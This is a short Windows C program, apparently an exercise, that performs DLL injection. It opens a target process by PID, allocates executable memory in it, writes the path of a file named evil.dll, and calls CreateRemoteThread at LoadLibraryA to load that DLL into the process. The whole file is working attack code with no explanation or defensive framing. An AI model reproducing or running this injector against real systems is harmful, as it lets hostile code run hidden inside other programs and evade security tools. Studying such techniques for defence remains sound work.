#include <windows.h>
#include <stdio.h> 

int main(int argc, char* argv[]) {

    HANDLE ph = OpenProcess(PROCESS_CREATE_THREAD | 
                                PROCESS_QUERY_INFORMATION |
                                PROCESS_VM_OPERATION |
                                PROCESS_VM_WRITE | 
                                PROCESS_VM_READ,
                            FALSE, atoi(argv[1]));
    
    char evildll[] = "C:\\Users\\ho4ngphwc\\Downloads\\DLL_Injection\\evil.dll";
    unsigned int evillen = sizeof(evildll) + 1;
    LPVOID rb = VirtualAllocEx(ph, NULL, evillen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    
    WriteProcessMemory(ph, rb, evildll, evillen, NULL);

    HMODULE hKernel32 = GetModuleHandle("kernel32");
    VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

    HANDLE rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    WaitForSingleObject(rt, INFINITE);
        
}